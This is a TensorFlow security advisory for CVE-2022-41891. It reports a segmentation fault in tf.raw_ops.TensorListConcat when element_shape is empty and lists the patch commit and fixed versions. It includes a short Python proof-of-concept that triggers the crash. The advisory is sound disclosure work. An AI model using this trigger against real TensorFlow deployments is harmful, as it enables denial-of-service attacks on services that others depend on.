<h2>TFSA-2022-154: Segfault in <code>tf.raw_ops.TensorListConcat</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-41891</p>
<h3>Impact</h3>
<p>If <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.h"><code>tf.raw_ops.TensorListConcat</code></a> is given <code>element_shape=[]</code>, it results segmentation fault which can be used to trigger a denial of service attack.
<code>python
import tensorflow as tf
tf.raw_ops.TensorListConcat(
    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),
    element_dtype=tf.dtypes.float32,
    element_shape=[]
)</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/fc33f3dc4c14051a83eec6535b608abe1d355fde">fc33f3dc4c14051a83eec6535b608abe1d355fde</a>.</p>
<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
